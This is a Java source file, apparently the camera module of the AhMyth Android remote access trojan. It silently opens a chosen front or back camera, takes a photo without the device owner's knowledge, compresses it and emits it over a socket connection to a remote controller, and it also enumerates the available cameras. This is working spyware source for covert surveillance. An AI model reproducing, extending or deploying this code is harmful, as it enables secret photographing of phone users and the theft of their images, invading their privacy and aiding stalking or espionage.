package ahmyth.mine.king.ahmyth;


import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.util.Log;


import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;


public class CameraManager {

    private Context context ;
    private Camera camera;


    public CameraManager(Context context) {
        this.context = context;
    }


    public void startUp(int cameraID){
            try{
                camera = Camera.open(cameraID);
                camera.startPreview();
                camera.takePicture(null, null, new PictureCallback() {
                    @Override
                    public void onPictureTaken(byte[] data, Camera camera) {
                        releaseCamera();
                        sendPhoto(data);
                    }
                });
            }catch (Exception ex){


            }
    }


    private void sendPhoto(byte [] data){

        try {

            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);
            JSONObject object = new JSONObject();
            object.put("image",true);
            object.put("buffer" , bos.toByteArray());

            Log.w("lalo", "SendPhoto: " + object);

            IOSocket.getInstance().getIoSocket().emit("x0000ca" , object);

        } catch (JSONException e) {
            e.printStackTrace();
            Log.w("lalo", "Error SendPhoto: " + e.getMessage());
        }

    }

    private void releaseCamera(){
        try {
            if (camera != null) {
                camera.stopPreview();
                camera.release();
                camera = null;
            }
        }catch (Exception ex)
        {

        }

    }

    public JSONObject findCameraList() {

        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return null;
        }

        try {
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList",true);

            // Search for available cameras
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Front");
                    jo.put("id", i);
                    list.put(jo);
                }
                else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK){
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Back");
                    jo.put("id", i);
                    list.put(jo);
                }
                else {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Other");
                    jo.put("id", i);
                    list.put(jo);
                }
            }

            cameras.put("list" , list);
            return cameras;

        } catch (JSONException e) {
            e.printStackTrace();
        }

        return null;

    }





}